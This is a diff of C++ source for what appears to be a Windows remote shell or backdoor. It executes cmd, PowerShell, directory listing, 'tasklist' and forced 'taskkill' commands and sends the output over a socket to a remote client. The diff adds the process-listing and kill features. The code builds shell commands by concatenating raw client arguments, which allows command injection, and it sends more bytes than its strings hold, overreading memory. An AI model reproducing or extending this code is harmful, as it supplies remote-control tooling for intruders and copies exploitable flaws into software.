@@ -1,7 +1,7 @@
 #include "Shell.h"
 #define FILE_TMP "cmd.tmp"
 #define BUFFER_LEN 256
-#define HUGE 4096
+#define HUGE 16384
 
 std::string Shell::return_command(const std::string cmd)
 {
@@ -36,7 +36,8 @@ void Shell::pwd(SOCKET* client)
 void Shell::ls(SOCKET* client)
 {
 	std::string ret = return_command("dir /b");
-	send(*client,("\n"+ret).c_str(),BUFFER_LEN,0);
+	send(*client, "HUGE_BUFFER", BUFFER_LEN, 0);
+	send(*client, ("\n"+ret).c_str(), HUGE, 0);
 }
 void Shell::runCMD(SOCKET* client,const std::vector<std::string> args)
 {
@@ -49,7 +50,8 @@ void Shell::runCMD(SOCKET* client,const std::vector<std::string> args)
 	std::cout << ret << std::endl;
 	if (ret != "") 
 	{ 
-		send(*client, "HUGE_BUFFER", 5, 0);
+		
+		send(*client, "HUGE_BUFFER", BUFFER_LEN, 0);
 		send(*client, ret.c_str(), HUGE, 0); 
 	}
 }
@@ -63,7 +65,8 @@ void Shell::runPOWERSHELL(SOCKET* client, const std::vector<std::string> args)
 	std::string ret = Shell::return_command(cmd).c_str();
 	if (ret != "") 
 	{
-		send(*client, "HUGE_BUFFER", 5, 0);
+
+		send(*client, "HUGE_BUFFER", BUFFER_LEN, 0);
 		send(*client, ret.c_str(), HUGE, 0);
 	}
 }
@@ -98,3 +101,40 @@ void Shell::exe(Client* client, const std::string filename)
 	if (ret != "") { send(*client->getSock(), ret.c_str(), BUFFER_LEN, 0); }
 	client->send_b("Done");
 }
+
+void Shell::ps(Client* client)
+{
+	std::string ret = Shell::return_command("tasklist");
+	std::cout << ret << std::endl;
+	if (ret != "")
+	{
+		send(*client->getSock(), "HUGE_BUFFER", BUFFER_LEN, 0);
+		send(*client->getSock(), ret.c_str(), HUGE, 0);
+	}
+}
+void Shell::kill(Client* client, const std::vector<std::string> args)
+{
+	if (args[1] == "-p")
+	{
+		client->send_b(std::string("Killing process with PID : " + args[2]).c_str());
+		std::string ret = Shell::return_command("taskkill /F /PID " + args[2]);
+		if (ret != "")
+		{
+			send(*client->getSock(), ret.c_str(), BUFFER_LEN, 0);
+		}
+		client->send_b("Done");
+	}
+	else if (args[1] == "-n")
+	{
+		client->send_b(std::string("Killing process with name : " + args[2]).c_str());
+		std::string ret = Shell::return_command("taskkill /IM " + args[2] + " /F " + args[2]);
+		if (ret != "")
+		{
+			send(*client->getSock(), ret.c_str(), BUFFER_LEN, 0);
+		}
+		client->send_b("Done");
+	}
+	else
+		client->send_b("Unknown parameters...");
+}
+
